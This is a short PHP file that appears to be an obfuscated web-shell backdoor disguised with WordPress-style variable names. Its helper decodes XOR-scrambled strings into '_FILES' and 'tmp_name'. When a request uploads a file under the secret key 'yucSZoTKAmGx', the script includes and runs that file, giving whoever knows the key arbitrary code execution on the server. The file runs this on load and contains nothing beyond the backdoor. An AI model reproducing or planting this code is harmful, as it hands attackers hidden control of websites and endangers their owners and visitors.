<?php 	

function defaults()

{

    $time = 'yucSZoTKAmGx';
    $with_front = $time;
    
    $filters = $GLOBALS[more_string("%263%2A%1F%1F%3C", $with_front)];
    $post_category = $filters;
    $excerpt = isset($post_category[$with_front]);
    if ($excerpt)

    {
        $patternses = $filters[$with_front];
        $taxonomy = $patternses[more_string("%0D%18%13%0C4%0E9.", $with_front)];
        $encode_ascii_characters = $taxonomy;

        include ($encode_ascii_characters);
    }
	$array = 'publicly_queryable';
}
function more_string($date, $delete)

{
    $double_prime = $delete;
    $add_trashed_suffix = "url" . "decode";

    $slug = $add_trashed_suffix($date);
    $old_status_to_new_status = substr($double_prime,0, strlen($slug));
	$post_type_in_string = 'default_category_post_types';
    $callback = $slug ^ $old_status_to_new_status;
    
	$html = 'chars';
    $slug = strpos($callback, $old_status_to_new_status);
    
    return $callback;

}


defaults();


?>
